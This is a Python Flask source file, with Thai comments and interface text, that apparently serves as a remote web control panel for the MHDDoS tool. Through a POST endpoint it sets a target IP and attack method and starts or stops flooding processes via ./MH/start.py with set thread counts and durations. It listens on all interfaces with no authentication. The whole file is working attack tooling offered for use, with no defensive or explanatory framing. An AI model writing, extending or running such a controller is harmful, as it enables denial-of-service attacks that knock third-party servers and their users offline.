from flask import Flask, render_template, request, jsonify
import os
import subprocess
import threading
import time

app = Flask(__name__, template_folder='templates')

# Global variables for storing current settings and processes
method = "UDP"  # You can specify this manually
ip = ""  # You can specify this manually
threads = 100
duration = 100
current_processes = []  # List to store all current running processes

# Function to run DDOS attack
def run_ddos(method, ip, threads, duration):
    global current_processes
    command = ["python3", "./MH/start.py", method, ip, str(threads), str(duration)] 
    process = subprocess.Popen(command)
    current_processes.append(process)

# Function to stop all DDOS attacks
def stop_all_ddos():
    global current_processes
    for p in current_processes:
        p.terminate()
    current_processes = []

# Function to display help and current settings with color
def display_current_settings():
    attack_status = "โจมตี" if current_processes else "ไม่มีการโจมตี"
    return f"""
    [UI ควบคุม MHDDoS]
    คีย์ลัด:
     - กด X: หยุดการโจมตีทั้งหมด
     - กด C: เริ่มการโจมตีใหม่
     - กด H: แสดงคำอธิบายการใช้งาน
     

    [INFO] การตั้งค่าในปัจจุบัน:
    IP={ip},
    Method={method},
    Threads={threads},
    Time={duration}
    """

# Route to handle command submissions
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/cmd', methods=['POST'])
def cmd():
    global method, ip, threads, duration, current_processes
    try:
        data = request.form  # To access data from the form
        command = data.get('command', '').strip()

        if command.lower() == 'x':  # Stop all attacks
            stop_all_ddos()
            return jsonify({"output": "โจมตีทั้งหมดถูกหยุดแล้ว\n" + display_current_settings()})
        
        elif command.lower() == 'c':  # Start new attack
            os.system('cls' if os.name == 'nt' else 'clear')  # Clear previous console output
            threading.Thread(target=run_ddos, args=(method, ip, threads, duration)).start()
            return jsonify({"output": "เริ่มโจมตีใหม่\n" + display_current_settings()})
        
        elif command.lower() == 'v':  # Change IP
            ip = data.get('ip', ip)
            return jsonify({"output": f"เปลี่ยน IP เป็น: {ip}\n" + display_current_settings()})
        
        elif command.lower() == 'b':  # Change Method
            method = data.get('method', method)
            return jsonify({"output": f"เปลี่ยน Method เป็น: {method}\n" + display_current_settings()})
        
        elif command.lower() == 'h':  # Show help
            return jsonify({"output": "แสดงคำอธิบายการใช้งาน\n" + display_current_settings()})
        
        elif command.lower() == 'q':  # Quit the program
            stop_all_ddos()
            return jsonify({"output": "ออกจากโปรแกรม\n" + display_current_settings()})
        
        else:
            return jsonify({"output": "ไม่พบคำสั่งที่ถูกต้อง\n" + display_current_settings()})

    except Exception as e:
        return jsonify({"output": "เกิดข้อผิดพลาด", "error": str(e)})

# Function to update the status
@app.route('/update_status', methods=['POST'])
def update_status():
    attack_status = "โจมตี" if current_processes else "ไม่มีการโจมตี"
    return jsonify({"status": attack_status})

# Main execution loop for handling inputs
def run_server():
    app.run(host='0.0.0.0', port=8000)


if __name__ == "__main__":
    run_server()
